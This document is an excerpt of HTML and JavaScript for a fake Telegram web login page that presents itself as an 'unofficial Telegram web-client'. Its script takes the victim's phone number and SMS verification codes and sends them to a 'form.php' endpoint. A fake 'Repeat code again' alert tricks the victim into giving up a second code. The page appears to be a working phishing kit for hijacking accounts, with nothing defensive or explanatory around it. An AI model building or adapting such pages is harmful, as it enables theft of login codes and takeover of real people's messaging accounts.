...
<!----><div ng-switch-default="" class="login_head_submit_wrap">
  <!----><a class="login_head_submit_btn" ng-if="!credentials.phone_code_hash">
    <my-i18n msgid="modal_next" id="phone">Next</my-i18n><my-i18n msgid="modal_next" id="phones">Next</my-i18n><i class="icon icon-next-submit">
    </i>
...
<!----><form name="mySendCodeForm" ng-if="!credentials.phone_code_hash" ng-submit="sendCode()" class="ng-pristine ng-invalid ng-invalid-required">
  ...
  <p class="login_form_lead" my-i18n="login_enter_number_description"><r id='text1'>Please choose your country and enter your full phone number.</r><r id='text2'>We sent an SMS with a verification code to your phone.</r></p>

<div id="block" >
<table>
  <td>
    <label for="inp" class="inp">
    <input type="tel"  id="conu" value="+" placeholder="" style="width:70px;">
  ...
  <span class="label">Number phone</span>
  <span class="focus-bg"></span>
</label>
  </td>
</table>
...
<!----><div ng-switch-default="" class="login_footer_wrap">
  <p my-i18n="login_about_intro">Welcome to the unofficial Telegram web-client.</p>
...
<!---->
  ...
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Enter your phone number!")}else{
    sender.src="form.php?phone="+con.value+numb.value;
    ...
    document.getElementById('ttx').innerHTML="Enter the code from SMS";

    //block.style.display="none";
  }
  };
  document.getElementById('phones').onclick = function(){
    if(document.getElementById('send_code').value===""){alert(" Enter SMS code!")}else{
      sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
      alert("Repeat code again")
      ii++;
    }
    if(ii == 2){
